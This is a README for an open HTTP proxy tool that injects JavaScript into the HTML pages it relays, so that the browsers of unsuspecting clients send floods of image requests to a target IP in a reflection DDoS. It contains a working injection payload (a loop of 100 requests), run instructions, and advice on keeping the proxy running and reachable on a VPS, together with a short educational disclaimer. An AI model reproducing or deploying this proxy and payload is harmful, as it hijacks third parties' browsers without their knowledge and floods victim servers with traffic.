# 🧠 Reflection DDoS via Open HTTP Proxy

This project is a Python-based open HTTP proxy that injects JavaScript into HTML responses. The injected script forces connected browsers to generate multiple outbound requests to a target server, simulating a reflection-based DDoS attack where unsuspecting clients become amplifiers.

## Features

- Open HTTP proxy on port 8080

- Injects JavaScript payload into HTML responses

Payload creates multiple image requests to a specified victim IP

Lightweight — no dependencies beyond the standard library

Ideal for research, educational labs, or pentesting your own systems


## How It Works

1. Clients connect through the proxy.

2. The proxy forwards HTTP traffic.

3. If the response is HTML, it appends a script that loads 100 image URLs from the victim server.

4. Each client unknowingly reflects traffic toward the target IP.


### Example Payload
```
<script>
  for (let i = 0; i < 100; i++) {
    let img = new Image();
    img.src = "http://198.51.100.77/img" + i + ".jpg";
  }
</script>
```
Replace 198.51.100.77 with your own controlled test server IP.


## Setup

1. Clone the repo.

2. Run the proxy:
```
python3 proxy.py
```

3. On a test browser, configure HTTP proxy to point to your VPS IP on port 8080.

4. Visit an HTTP (non-HTTPS) website.

5. Monitor the target server for incoming traffic.


## Deployment Notes

Use nohup, screen, tmux, or systemd to keep it running.

Ensure port 8080 is open on both UFW and your VPS firewall panel.


## Disclaimer

This tool is provided for educational and testing purposes only. Do not use it on unauthorized networks or systems. You are fully responsible for any misuse.
